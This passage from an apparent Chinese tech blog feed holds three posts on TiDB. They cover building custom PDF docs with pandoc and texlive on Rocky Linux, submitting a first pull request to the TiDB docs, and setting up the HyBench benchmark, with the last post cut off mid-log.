<p><a class="link"   href="https://asktug.com" >Asktug.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 论坛里偶有小伙伴询问如何自助生成 PDF 格式的 TiDB 文档，或是 PDF 太长，经常查阅的只是其中一部分，如何只生成那一部分的 TiDB 文档。本文将介绍如何在 Rocky Linux 9 上自助生成 PDF 格式的 TiDB 文档。</p>
<p>没听过十年二手玫瑰，是不会轻易做这种尝试的，对于 LaTaX 新手来说，积累本文素材的过程极为痛苦。不建议各位看官实操本文的第二种方法，还是推荐使用第一种方法，基本按照官方推荐的、经过测试的方法来，便捷、有效、易用。</p>
<h2 id="环境准备">环境准备</h2>
<ol>
<li>操作系统：Rocky Linux 9.3</li>
</ol>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ <span class="built_in">cat</span> /etc/redhat-release </span><br><span class="line">Rocky Linux release 9.3 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ <span class="built_in">uname</span> -rsm</span><br><span class="line">Linux 5.14.0-362.13.1.el9_3.x86_64 x86_64</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>前置安装：git, podman</li>
</ol>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ git --version</span><br><span class="line">git version 2.39.3</span><br><span class="line">[shawnyan@rocky9 ~]$ </span><br><span class="line">[shawnyan@rocky9 ~]$ podman --version</span><br><span class="line">podman version 4.6.1</span><br></pre></td></tr></table></figure></div>
<p>注：OS 和相关软件不是本文重点，遂一笔带过。</p>
<ol start="3">
<li>拉取 <code>pandoc/latex</code> 镜像</li>
</ol>
<p>使用 podman 拉取 pandoc 镜像：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">podman pull pandoc/latex</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]<span class="comment"># podman pull pandoc/latex</span></span><br><span class="line">✔ docker.io/pandoc/latex:latest</span><br><span class="line">Trying to pull docker.io/pandoc/latex:latest...</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 13d63ff5f1df <span class="keyword">done</span>  </span><br><span class="line">...</span><br><span class="line">Copying config 11172c3435 <span class="keyword">done</span>  </span><br><span class="line">Writing manifest to image destination</span><br><span class="line">11172c3435762783d582093f4eae6cf80548ff4443a26532e35f36dac8b2ec77</span><br></pre></td></tr></table></figure></div>
<p>查看镜像信息：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]<span class="comment"># podman images | grep pandoc</span></span><br><span class="line">docker.io/pandoc/latex            latest      11172c343576  9 months ago   550 MB</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>克隆 TiDB 文档库代码</li>
</ol>
<p>这里以 TiDB 中文文档为例，克隆文档：</p>
<p>（为加速下载，也避免网路问题，这里选择从 gitee 克隆代码）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/shawnyan/docs-cn.git --depth=1</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ git <span class="built_in">clone</span> https://gitee.com/shawnyan/docs-cn.git --depth=1</span><br><span class="line">Cloning into <span class="string">&#x27;docs-cn&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 2472, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (2472/2472), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (2392/2392), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 2472 (delta 122), reused 1622 (delta 80), pack-reused 0</span><br><span class="line">Receiving objects: 100% (2472/2472), 160.93 MiB | 8.04 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (122/122), <span class="keyword">done</span>.</span><br><span class="line">Updating files: 100% (2440/2440), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure></div>
<p>克隆完成后，查看版本，确认当前文档源码为最新版。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 docs-cn]$ git lg</span><br><span class="line">* a19b956 - (grafted, HEAD -&gt; master, origin/master, origin/HEAD) upgrade TiDB: check DDL and backup status before checking cluster health (<span class="comment">#15936) (2 days ago) &lt;Aolin&gt;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="方法一：使用-pandoc-latex-镜像生成-PDF-文档">方法一：使用 <code>pandoc/latex</code> 镜像生成 PDF 文档</h2>
<p>在 TiDB 中文文档代码库的 <a class="link"   href="https://github.com/pingcap/docs-cn#tidb-%E6%96%87%E6%A1%A3" >README <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中有这样一段介绍，并给出了相关教程。</p>
<blockquote>
<p>如果你想在本地定制输出符合特定场景需求的 PDF 格式的 TiDB 文档，例如对 TiDB 文档目录进行自由排序和删减，请参考自助生成 TiDB 文档 PDF 教程。</p>
</blockquote>
<p>只是教程中介绍的是 Windows 和 macOS 环境，下面将介绍在 Linux 环境下的相关操作流程，推荐有需求的同学使用这种方法。</p>
<p>TiDB 文档目录在 <code>TOC.md</code> 文件中，编辑此文件按需进行调整、删减。</p>
<p>例如，在本例中，为便于演示，只保留部分内容。</p>
<div class="highlight-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line">&lt;!-- markdownlint-disable MD007 --&gt;</span><br><span class="line">&lt;!-- markdownlint-disable MD041 --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> [<span class="string">文档中心</span>](<span class="link">https://docs.pingcap.com/zh</span>)</span><br><span class="line"><span class="bullet">-</span> 关于 TiDB</span><br><span class="line"><span class="bullet">  -</span> [<span class="string">TiDB 简介</span>](<span class="link">/overview.md</span>)</span><br><span class="line"><span class="bullet">  -</span> [<span class="string">TiDB 7.5 Release Notes</span>](<span class="link">/releases/release-7.5.0.md</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>将所有 Markdown 文档文件按照 <code>TOC.md</code> 整合到一个 <code>doc.md</code> 文件中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd docs-cn</span><br><span class="line">python scripts/merge_by_toc.py</span><br></pre></td></tr></table></figure></div>
<p>运行 <code>andelf/doc-build</code> 容器，在本例中，文档源码目录为 <code>/root/docs-cn</code> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">podman run -it -v /root/docs-cn:/opt/data:rw --privileged=true andelf/doc-build:0.1.9</span><br></pre></td></tr></table></figure></div>
<p>在容器中运行生产 PDF 的脚本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/data</span><br><span class="line">bash scripts/generate_pdf.sh</span><br></pre></td></tr></table></figure></div>
<p>预期输出：将在宿主机上的文档源码目录下生成一个 <code>output.pdf</code> 文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 docs-cn]# ls output.pdf </span><br><span class="line">output.pdf</span><br></pre></td></tr></table></figure></div>
<p>//img</p>
<p>到此，演示结束，只是在 PDF 文档属性中还发现一处小问题，PDF 文件文档属性中的标题和作者在生成过程中未填充，需要在 <code>generate_pdf.sh</code> 文件中补充两行内容。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-V title-meta=&quot;TiDB 中文手册&quot; \</span><br><span class="line">-V author-meta=&quot;PingCAP Inc.&quot; \</span><br></pre></td></tr></table></figure></div>
<p>//img</p>
<p>补充后，效果如图：</p>
<p>//img</p>
<h2 id="方法二：直接安装-pandoc-texlive-软件并生成-PDF-文档">方法二：直接安装 pandoc,texlive 软件并生成 PDF 文档</h2>
<p>这种方法过程极为复杂繁琐，好处是可以使用最新版本的 pandoc 和 texlive。</p>
<ol>
<li>安装一些依赖包。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf install curl wget git bzr mercurial openssl-client subversion procps</span><br><span class="line">dnf install autoconf automake bzip2 dpkg-dev file g++ gcc imagemagick</span><br><span class="line">dnf install tcl tcl-devel tk tk-devel python3 libbz2-dev libc6-dev</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>安装 pandoc。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dnf install pandoc</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# pandoc --version</span><br><span class="line">pandoc 2.14.0.3</span><br><span class="line">Compiled with pandoc-types 1.22.1, texmath 0.12.3.3, skylighting 0.10.5.2,</span><br><span class="line">citeproc 0.4.0.1, ipynb 0.1.0.1</span><br><span class="line">User data directory: /root/.local/share/pandoc</span><br><span class="line">Copyright (C) 2006-2021 John MacFarlane. Web:  https://pandoc.org</span><br><span class="line">This is free software; see the source for copying conditions. There is no</span><br><span class="line">warranty, not even for merchantability or fitness for a particular purpose.</span><br><span class="line">[root@rocky9 ~]# </span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>安装 texlive。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz</span><br><span class="line">tar zxf install-tl-unx.tar.gz</span><br><span class="line">cd install-tl-20240101/</span><br><span class="line">perl ./install-tl</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>安装中文字体，官方使用的是 文泉驛（WenQuanYi），或是其他中文字体。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fc-list :lang-zh | grep -i wenq</span></span><br><span class="line">/usr/share/fonts/truetype/wqy/wqy-microhei.ttc: WenQuanYi Micro Hei,文泉驛微米黑,文泉驿微米黑:style=Regular</span><br><span class="line">/usr/share/fonts/truetype/wqy/wqy-microhei.ttc: WenQuanYi Micro Hei Mono,文泉驛等寬微米黑,文泉驿等宽微米黑:style=Regular</span><br></pre></td></tr></table></figure></div>
<ol start="5">
<li>生成 PDF 文档。</li>
</ol>
<p>由于 pandoc 版本升级更新，原有的参数发生变化，比如 <code>--latex-engine</code> 不再支持，需要替换为 <code>--pdf-engine</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">MAINFONT=&quot;Microsoft YaHei&quot;</span><br><span class="line">MONOFONT=&quot;Microsoft YaHei&quot;</span><br><span class="line"></span><br><span class="line">pandoc --pdf-engine=xelatex doc.md -o output2.pdf --toc -s \</span><br><span class="line">-V title=&quot;TiDB 文档（节选）&quot; \</span><br><span class="line">-V author=&quot;ShawnYan&quot; \</span><br><span class="line">-V title-meta=&quot;TiDB 文档（节选）&quot; \</span><br><span class="line">-V author-meta=&quot;ShawnYan&quot; \</span><br><span class="line">-V CJKmainfont=&quot;$&#123;MAINFONT&#125;&quot; \</span><br><span class="line">-V mainfont=&quot;$&#123;MAINFONT&#125;&quot; \</span><br><span class="line">-V sansfont=&quot;$&#123;MAINFONT&#125;&quot; \</span><br><span class="line">-V monofont=&quot;$&#123;MONOFONT&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<p>对于模板文件，直接用新版 pandoc 调用会报错，需要做些调整，如下图。</p>
<img  alt="img2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240108-97c591c9-387f-4ea9-8214-112a9397262a.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="小结">小结</h2>
<p>方法一足够简单、实用，推荐有需求的同学使用，方法二只是其他途径探索，不做推荐。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB Docs</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 7.x</tag>
        <tag>tidb docs</tag>
      </tags>
  </entry>
  <entry>
    <title>如何为 TiDB 文档提交第一个 PR</title>
    <url>/2024/tidb/tidb-docs-1st-pr/</url>
    <content><![CDATA[<p>今日已是 2024 年，2023 已成过往，去年我曾说，如果中国数据库的文档有排行榜，那么 TiDB 文档注定“遥遥领先”（褒义词）。</p>
<h2 id="TiDB-Docs-Dash">TiDB Docs Dash</h2>
<img  alt="dash.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-4f791564-7f5d-4152-bd6b-67a9f0880080.png"
                      referrerpolicy="no-referrer"
                >
<p>2024 TiDB 文档挑战赛来啦!</p>
<p>首届 TiDB 文档挑战赛 (TiDB Docs Dash) 将于 2024 年 1 月 9 日 - 12 日进行。同时，我们也希望将借此机会将 TiDB 社区成员聚集到一起，为大家带来一次有趣的协作体验。</p>
<p>通过此次活动，你将有机会结识其他社区成员，与大家一起共同改进 TiDB 和 TiDB Cloud 文档。</p>
<p>详细活动介绍，请参阅帖子：<a class="link"   href="https://asktug.com/t/topic/1019364?u=shawnyan" >TiDB 文档挑战赛 2024 来了！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>或公众号文章：<a class="link"   href="https://mp.weixin.qq.com/s/875zEvSi2ys3lUykuHolSA" >2024 TiDB 文档挑战赛｜提 PR 和 Issue 来赢取 Bose 耳机、机械键盘等奖品吧！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TiDB-文档">TiDB 文档</h2>
<p>TiDB 文档目前支持中、英、日三种语言。文档站链接分别是：</p>
<ul>
<li>简体中文：<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable" >https://docs.pingcap.com/zh/tidb/stable <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>English：<a class="link"   href="https://docs.pingcap.com/tidb/stable" >https://docs.pingcap.com/tidb/stable <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>日本語：<a class="link"   href="https://docs.pingcap.com/ja/tidb/stable" >https://docs.pingcap.com/ja/tidb/stable <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>其中，日本语文档站是由英文机翻的。(このページは英語版のページを機械翻訳しています。)</p>
<p>TiDB 文档也是开源的，中文和英文站的文档仓库分别是：</p>
<ul>
<li>TiDB 中文文档仓库：<a class="link"   href="https://github.com/pingcap/docs-cn" >https://github.com/pingcap/docs-cn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>TiDB 和 TiDB Cloud 英文文档仓库：<a class="link"   href="https://github.com/pingcap/docs" >https://github.com/pingcap/docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>欢迎点个 Star 🌟</p>
<img  alt="star.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-a1cb517f-cde5-41fb-baaf-5226e4ed2777.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="提交-PR">提交 PR</h2>
<p>下面演示一下如何为 TiDB 文档提交 PR (Pull Reuest) 。<br>
需要准备的环境有 git, vscode，注册 GitHub 账号，并 fork 文档的源码仓库。</p>
<h3 id="Fork">Fork</h3>
<p>点击仓库右上角的 Fork 按钮，或直接点击这里 <strong><a class="link"   href="https://github.com/pingcap/docs-cn/fork" >Fork <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong>，等待 Fork 完成即可。</p>
<img  alt="fork.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-e8b52214-bf01-4b12-b8b6-f5791b31b37c.png"
                      referrerpolicy="no-referrer"
                >
<p>Fork 完成后，会在自己的用户下出现一个源码仓，这里看到已经 Fork 完成，并且是最新版本。</p>
<img  alt="forked.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-3acd341f-7fa6-43d1-aa35-b62b81c957ab.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Clone">Clone</h3>
<p>打开 VS Code，源码控制，登录 GitHub 账户，如果浏览器已经登陆，点击【Clone from GitHub】会自动登录。</p>
<img  alt="clone1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-b915c0de-74a7-4774-8421-28d3d56a9184.png"
                      referrerpolicy="no-referrer"
                >
<p>登录后，输入【username/docs-cn】。</p>
<img  alt="clone2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-669c6308-e503-4ca8-95dd-40a89376c0ac.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Branch">Branch</h3>
<p>克隆代码后，创建一个新分支，用于修改、维护，这里命名为【br-1st-pr】。</p>
<img  alt="branch.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-2a02bbd8-274c-4a0f-9de4-6460b29fdac5.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Modify">Modify</h3>
<p>找到需要修改的文件，按需修改后提交。</p>
<p>关于如何找到文件所在路径的问题，我们在查阅文档时，右上角有个【文档反馈】的链接，点击后会提示文件所在路径。</p>
<p>例如，我想修改 【TiDB 7.5.0 Release Notes】 页面，点击右上角【文档反馈】，</p>
<img  alt="modify.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-480a9c01-c4ea-46a6-b176-4baeb2d82dcb.png"
                      referrerpolicy="no-referrer"
                >
<p>将会跳转到【pingcap/docs-cn】的 Issues 页面，并给出了源码路径。</p>
<img  alt="modify2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-59d5179b-4014-47bc-bd02-f9fc0b8ec839.png"
                      referrerpolicy="no-referrer"
                >
<p>修改后，Source Control 会提示 Changes ，Commit 后会先提交到本地，</p>
<img  alt="modify3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-8a3dfd94-3aab-4a43-9800-3e04cce67665.png"
                      referrerpolicy="no-referrer"
                >
<p>还需要 Push 到远程。</p>
<img  alt="modify4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-65c3f2c4-309c-4ce8-be72-82eaf394d0c6.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="PR">PR</h3>
<p>Push 成功后，可以在 GitHub 上看到修改后的内容，</p>
<img  alt="modify5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-4b951651-52db-4bf4-b4e4-7ab154618dbd.png"
                      referrerpolicy="no-referrer"
                >
<p>并提示进行【Compare &amp; pull request】。</p>
<img  alt="modify6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-92b88444-08d5-46af-b531-9d895c304dd7.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="CLA">CLA</h3>
<p>需要注意的是，首次在本仓库提 PR 时，请务必签署 <a class="link"   href="https://cla-assistant.io/pingcap/docs-cn" >Contributor License Agreement <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (CLA)，否则我们将无法合并你的 PR。成功签署 CLA 后，可继续进行后续操作。</p>
<img  alt="CLA.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-95731be3-dbb4-4c8b-bdc9-e66ceed75372.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Merge">Merge</h3>
<p>提交 PR 后，贵司会有同学定期来进行 Review 和 Approve，静待 Merge 就好。</p>
<h2 id="Done">Done</h2>
<p>恭喜你，到此已经基本了解如何对 TiDB 文档进行修改和提 PR 了，欢迎参与 2024 TiDB Docs Dash 活动。</p>
<h2 id="番外篇">番外篇</h2>
<p>搜了下记录，2022、2023年给 TiDB 文档提了若干 Issue &amp; PR，希望在正确的道路上继续飞驰。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240101-28d89e8f-d033-4a46-9e3d-97f5ca0d9baa.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="Ref">Ref</h2>
<p>更多内容请参考: <a class="link"   href="https://github.com/pingcap/docs-cn/blob/master/CONTRIBUTING.md" >TiDB 中文文档贡献指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>(2024-01-01, 2024 年第 001 篇原创文章)</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB Docs</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 7.x</tag>
        <tag>tidb docs</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 HyBench 测试 TiDB</title>
    <url>/2024/tidb/tidb-test-with-hybench/</url>
    <content><![CDATA[<img  alt="img01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240108-dfb9b292-6804-4902-a0b4-55ffede33402.png"
                      referrerpolicy="no-referrer"
                >
<blockquote>
<p>图片选自: <a class="link"   href="https://asktug.com/t/topic/1020117" >https://asktug.com/t/topic/1020117 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>本文将介绍如何使用 HyBench 对 TiDB 进行测试，并简述 HyBench 适配 TiDB 的注意事项。</p>
<p>Hybench 是一款由中国软件评测中心、清华大学联合牵头，多家公司共同研发的 HTAP 数据库基准测试工具。</p>
<p>TiDB 是一款兼容 MySQL 的数据库，Hybench 已在 Gitee 开源，支持 MySQL 数据库，通过修改 HyBench 源码以适配 TiDB。</p>
<h2 id="前置需求">前置需求</h2>
<ol>
<li>为方便演示，这里直接启动一个 TiDB 本地测试集群。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# tiup playground display</span><br><span class="line">tiup is checking updates for component playground ...</span><br><span class="line">Starting component `playground`: /root/.tiup/components/playground/v1.14.1/tiup-playground display</span><br><span class="line">Pid   Role     Uptime</span><br><span class="line">---   ----     ------</span><br><span class="line">7146  pd       4h4m9.520051218s</span><br><span class="line">7164  tikv     4h3m23.583874294s</span><br><span class="line">7320  tidb     4h3m10.59454483s</span><br><span class="line">7332  tiflash  4h1m54.080597745s</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>准备 JDK 17，并配置环境变量。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# java -version</span><br><span class="line">openjdk version &quot;17.0.9&quot; 2023-10-17 LTS</span><br><span class="line">OpenJDK Runtime Environment (Red_Hat-17.0.9.0.9-1) (build 17.0.9+9-LTS)</span><br><span class="line">OpenJDK 64-Bit Server VM (Red_Hat-17.0.9.0.9-1) (build 17.0.9+9-LTS, mixed mode, sharing)</span><br><span class="line">[root@rocky9 ~]# env | grep -i java</span><br><span class="line">JAVA_HOME=/usr/lib/jvm/java-17-openjdk-17.0.9.0.9-2.el9.x86_64</span><br><span class="line">PATH=/root/.tiup/bin:/usr/lib/jvm/java-17-openjdk-17.0.9.0.9-2.el9.x86_64/bin:...</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>安装 Maven。</li>
</ol>
<p>直接使用 <code>dnf</code> 安装即可，版本信息如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# mvn --version</span><br><span class="line">Apache Maven 3.6.3 (Red Hat 3.6.3-15)</span><br><span class="line">Maven home: /usr/share/maven</span><br><span class="line">Java version: 17.0.9, vendor: Red Hat, Inc., runtime: /usr/lib/jvm/java-17-openjdk-17.0.9.0.9-2.el9.x86_64</span><br><span class="line">Default locale: en_US, platform encoding: UTF-8</span><br><span class="line">OS name: &quot;linux&quot;, version: &quot;5.14.0-362.13.1.el9_3.x86_64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot;</span><br></pre></td></tr></table></figure></div>
<img  alt="02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240117-319d8aaa-67ab-4f1a-b7ec-ae2327f1397c.png"
                      referrerpolicy="no-referrer"
                >
<!--
dnf install java-17-openjdk java-17-openjdk-devel
dnf install maven

vi ~/.bashrc
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-17.0.9.0.9-2.el9.x86_64
export PATH=$JAVA_HOME/bin:$PATH
-->
<h2 id="运行测试">运行测试</h2>
<h3 id="1-修改数据库连接信息">1. 修改数据库连接信息</h3>
<p>依据实际需求修改配置文件 <code>conf/db.prop</code> 中的 HOST, IP, USERNAME, PASSWORD 等信息。</p>
<h3 id="2-生成测试数据">2. 生成测试数据</h3>
<p>运行生成数据的命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./hybench -t gendata -c conf/db.prop</span><br></pre></td></tr></table></figure></div>
<p>输出结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 hybench]# ./hybench -t gendata -c conf/db.prop</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  HyBench:324 - Hi~Bench, HyBench</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:57 - ===============configuration==================</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - xapclient = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - at2_percent = 25</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - at1_percent = 35</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - apclient = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - xpRunMins = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - at4_percent = 15</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - apround = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - url = jdbc:mysql://192.168.8.92:4000/hybench?useUnicode=true&amp;characterEncoding=utf-8</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - tpRunMins = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - at3_percent = 15</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - password = </span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - tpclient = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - fresh_interval = 20</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - sf = 1x</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - classname = com.mysql.cj.jdbc.Driver</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - xtpclient = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - apRunMins = 1</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - at5_percent = 7</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - db = tidb</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - username = root</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:59 - at6_percent = 3</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:61 - ===============configuration==================</span><br><span class="line">2024-01-16 23:07:30 [main] INFO  ConfigLoader:62 - </span><br><span class="line">This is a data generator of HyBench, Version 0.1</span><br><span class="line">----------------</span><br><span class="line">----------------</span><br><span class="line">----------------</span><br><span class="line">Data is generating...</span><br><span class="line">----------------</span><br><span class="line">----------------</span><br><span class="line">----------------</span><br><span class="line">WARNING: dir:/root/hybench/Data_1x not exists! will created.</span><br><span class="line">Data generate not skipped!</span><br><span class="line">Data is ready under the Data folder!</span><br><span 